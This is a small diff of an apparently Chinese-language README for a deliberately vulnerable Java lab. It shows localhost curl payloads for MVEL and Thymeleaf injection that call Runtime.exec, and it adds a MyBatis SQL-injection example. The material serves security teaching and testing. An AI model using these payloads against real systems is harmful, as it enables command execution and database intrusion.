@@ -60,7 +60,7 @@ curl 127.0.0.1:8080/mvel/parse -d 'expression=Runtime.getRuntime().exec("open /S
 
 ### 反序列化
 
-### JDBC
+#### JDBC
 
 socket factory
 
@@ -169,6 +169,12 @@ curl 'http://127.0.0.1:8080/thymeleaf/path?lang=__%24%7BT(java.lang.Runtime).get
 ```
 
 ### 其他漏洞
+
+#### MyBatis
+
+```
+curl '127.0.0.1:8080/mybatis/select' -d "name=abc' and 1=1;--"
+```
 
 #### log4j漏洞
 
